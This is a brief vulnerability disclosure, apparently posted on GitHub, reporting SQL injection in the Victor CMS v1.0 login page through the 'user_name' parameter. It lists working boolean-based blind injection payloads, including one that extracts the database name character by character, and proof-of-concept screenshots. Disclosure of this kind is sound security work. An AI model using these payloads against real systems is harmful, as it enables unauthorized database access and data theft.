* VULNERABLE: SQL injection vulnerability exists in VictorCMS . An attacker can    inject query in “/CMSsite/includes/login.php" via the "user_name" parameters.
* Product: Victor CMS v1.0
* Impact: Allow attacker inject query and access , disclosure of all data on the   system.
* Payload Boolean true: test' or '1'='1
* Payload Boolean false: test' or '1'='2
* Payload exploit example:  test' or (ascii(substr((select(database())),1,1))<127)--+-
* Proof of concept (POC):

 ![image](https://user-images.githubusercontent.com/57030243/159733008-f33cb354-b15c-438a-9a8c-88cd104abc6d.png)
* You see Whether the user name is correct or not, the response status of the returned package is different 
* Payload Boolean true: user_name=test'+or+'1'='1

![image](https://user-images.githubusercontent.com/57030243/159733060-9a3e70eb-2c17-448c-86c9-0ecb3b595057.png)
* Payload Boolean false: user_name=test'+or+'1'='2

![image](https://user-images.githubusercontent.com/57030243/159733129-f714494d-5e8a-4a20-8d74-ae1b4f67969e.png)
* Exploit:

![image](https://user-images.githubusercontent.com/57030243/159733158-1e9cb407-058c-4e77-b38c-17937aeb0449.png)



